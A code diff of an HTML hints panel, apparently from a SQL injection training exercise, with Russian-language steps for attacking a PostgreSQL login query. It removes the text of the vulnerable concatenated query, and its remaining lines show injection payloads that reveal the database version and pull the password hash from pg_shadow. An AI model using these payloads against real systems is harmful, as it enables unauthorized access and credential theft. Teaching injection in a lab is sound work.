@@ -38,14 +38,9 @@
 <div class="collapse" id="collapseExample">
   <div class="card card-body">
         <div>
-            <h3>На сервере выполняется следующий запрос к БД:</h3>
-            <p class='review'>SELECT EXISTS (SELECT * FROM pg_shadow WHERE usename = '" + login + "' AND passwd = '" + full_hash + "');</p>
-        </div>
-        <div>
             <h3>1. Узнать версию БД</h3>
             <i><p>Используется закрытие ковычек и комментарий в конце</p></i>
             <p class='review'>123')||(SELECT version());--</p>
-            <i><p>Для объединения запросов используется ||</p></i>
         </div>
         <div>
             <h3>2. Узнать текущего пользователя БД</h3>
@@ -58,7 +53,6 @@
         <div>
             <h3>4. Получить логин и хэш пароля</h3>
             <p class='review'>123')||(SELECT passwd FROM pg_shadow WHERE usename = current_user);--</p>
-            <i><p>Системная таблица pg_shadow хранит логины и хэши паролей</p></i>
         </div>
   </div>
 </div>
